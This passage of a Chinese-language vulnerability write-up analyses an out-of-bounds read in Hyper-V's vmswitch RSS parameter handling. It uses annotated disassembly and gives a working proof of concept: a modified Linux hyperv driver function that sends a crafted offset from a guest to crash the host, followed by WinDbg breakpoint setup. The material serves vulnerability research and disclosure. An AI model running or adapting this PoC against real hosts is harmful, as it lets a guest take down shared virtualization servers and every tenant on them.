
```
VmsVmNicHandleRssParametersChange+11C          mov     edx, [rbp+10h] 

VmsVmNicHandleRssParametersChange+11C     ; [rbp+10] ---- Rssp->indirect_taboffset

VmsVmNicHandleRssParametersChange+11F          movzx   r13d, r15w

VmsVmNicHandleRssParametersChange+123          lea     r12, [rsi+294h]

VmsVmNicHandleRssParametersChange+12A          mov     r8d, r13d      

VmsVmNicHandleRssParametersChange+12A                        ; rbp ---- Rssp

VmsVmNicHandleRssParametersChange+12D          add     rdx, rbp        ; Src

VmsVmNicHandleRssParametersChange+130          mov     rcx, r12        ; Dst

VmsVmNicHandleRssParametersChange+133          shl     r8, 2          ; Size

VmsVmNicHandleRssParametersChange+137          call    memmove

VmsVmNicHandleRssParametersChange+13C          xor     eax, eax

VmsVmNicHandleRssParametersChange+13E          mov     [rsi+494h], r15w

VmsVmNicHandleRssParametersChange+146          mov     byte ptr [rsi+496h], 1

VmsVmNicHandleRssParametersChange+14D          cmp     ax, r15w

VmsVmNicHandleRssParametersChange+151          jnb     short loc_64FDB

VmsVmNicHandleRssParametersChange+215  loc_65089:

VmsVmNicHandleRssParametersChange+215        mov     edx, [rbp+18h]  

VmsVmNicHandleRssParametersChange+215        ; [rbp+18h] ---- rssp->kashkey_offset

VmsVmNicHandleRssParametersChange+218        movzx   r8d, word ptr [rbp+14h] ; Size

VmsVmNicHandleRssParametersChange+21D        lea     rbx, [rsi+497h]

VmsVmNicHandleRssParametersChange+224        add     rdx, rbp        ; Src

VmsVmNicHandleRssParametersChange+227        mov     rcx, rbx        ; Dst

VmsVmNicHandleRssParametersChange+22A        call    memmove

VmsVmNicHandleRssParametersChange+22F        movzx   eax, word ptr [rbp+14h]

VmsVmNicHandleRssParametersChange+233        lea     rcx, [rsi+4C8h]

VmsVmNicHandleRssParametersChange+23A        mov     r8d, eax

VmsVmNicHandleRssParametersChange+23D        mov     rdx, rbx

VmsVmNicHandleRssParametersChange+240        mov     [rsi+4C0h], ax

VmsVmNicHandleRssParametersChange+247   call    cs:__imp_RtlInitializeToeplitzHash

VmsVmNicHandleRssParametersChange+24D        mov     [rsi+4E0h], al

VmsVmNicHandleRssParametersChange+253        test    al, al

VmsVmNicHandleRssParametersChange+255        jnz     short loc_65129
```

通过上面的代码可知，两处代码在调用`memmove`函数时，没有检查`Src`参数指向的内存是否越界。参数`Src`的值是由一个地址加上偏移而得来的，但是这个偏移我们是能通过虚拟机发送的数据控制的，所以造成了宿主机驱动中的越界读。一旦偏移足够大，读到非法的内存位置便可以造成BugCheck，导致宿主机蓝屏。

在上面的汇编代码中，`VmsVmNicHandleRssParametersChange+0x11C`语句是将虚拟机传来的数据`rssp->indirect_taboffset`加上一个地址便是`memmove`函数的`Src`参数，由于`rssp->indirect_taboffset`可以控制，所以`Src`参数便可以从虚拟机中控制。上文中另外一处代码`VmsVmNicHandleRssParametersChange+0x215`也是如此。

### 6.2. PoC编写与漏洞触发

和上面一样，这里我们的PoC可以直接通过修改Hyper-V在Linux内核驱动代码实现，故我们在`./linux-4.7.2/drivers/net/hyperv/rndis_filter.c`文件中添加如下代码。

```
static int rndis_filter_query_device_mac(struct rndis_device *dev)
//这个函数是Linux Kernel中原有的函数，我们需要修改它
{
u32 size = ETH_ALEN;
rndis_pool_overflow(dev);//这是我们加上的语句
return rndis_filter_query_device(dev,
RNDIS_OID_802_3_PERMANENT_ADDRESS,
dev->hw_mac_adr, &size);
}
//下面为新增加的函数，用于触发漏洞
static int rndis_pool_overflow(struct rndis_device *rdev)
{
  printk(KERN_ALERT"[+]Run POC!");
  struct net_device *ndev = rdev->ndev;
  int num_queue = 0;
  struct rndis_request *request;
  struct rndis_set_request *set;
  struct rndis_set_complete *set_complete;
  u32 extlen = sizeof(struct ndis_recv_scale_param) +
               4*ITAB_NUM + HASH_KEYLEN;
  struct ndis_recv_scale_param *rssp;
  u32 *itab;
  u8 *keyp;
  int i, ret;
  unsigned long t;
  request = get_rndis_request(
      rdev, RNDIS_MSG_SET,
      RNDIS_MESSAGE_SIZE(struct rndis_set_request) + extlen);
  if (!request)
    return -ENOMEM;

  set = &request->request_msg.msg.set_req;
  set->oid = OID_GEN_RECEIVE_SCALE_PARAMETERS;
  set->info_buflen = extlen;
  set->info_buf_offset = sizeof(struct rndis_set_request);
  set->dev_vc_handle = 0;

  rssp = (struct ndis_recv_scale_param *)(set + 1);
  rssp->hdr.type = NDIS_OBJECT_TYPE_RSS_PARAMETERS;
  rssp->hdr.rev = NDIS_RECEIVE_SCALE_PARAMETERS_REVISION_2;
  rssp->hdr.size = sizeof(struct ndis_recv_scale_param);
  rssp->flag = 0;
  rssp->hashinfo = NDIS_HASH_FUNC_TOEPLITZ | NDIS_HASH_IPV4 |
      NDIS_HASH_TCP_IPV4 | NDIS_HASH_IPV6 |
      NDIS_HASH_TCP_IPV6;
  rssp->indirect_tabsize = 4*ITAB_NUM;
  rssp->indirect_taboffset = 0x80808080;//这里会导致越界读
  rssp->hashkey_size = HASH_KEYLEN;
  rssp->kashkey_offset = rssp->indirect_taboffset +
                         rssp->indirect_tabsize;

  ret = rndis_filter_send_request(rdev, request);
  if (ret != 0)
    goto cleanup;
  t = wait_for_completion_timeout(&request->wait_event, 5*HZ);
  if (t == 0) {
    netdev_err(ndev, "timeout before we got a set response...\n");
    /* can't put_rndis_request, since we may still receive a
    * send-completion.
    */
    return -ETIMEDOUT;
  } else {
  set_complete = &request->response_msg.msg.set_complete;
    if (set_complete->status != RNDIS_STATUS_SUCCESS) {
        netdev_err(ndev, "Fail to set RSS parameters:0x%x\n",
                   set_complete->status);
        ret = -EINVAL;
    }
  }
cleanup:
  put_rndis_request(rdev, request);
  return ret;
}
```

PoC代码非常简单，只需修改`rssp->indirect_taboffset`或者`rssp->kashkey_offset`的值即可，然后重新编译内核，重启虚拟机，便可复现漏洞。

### 6.3. 调试

`WinDbg`在`vmswitch! VmsVmNicHandleRssParametersChange`函数偏移`0x11C`处设置断点，启动虚拟机，等待断点被访问。
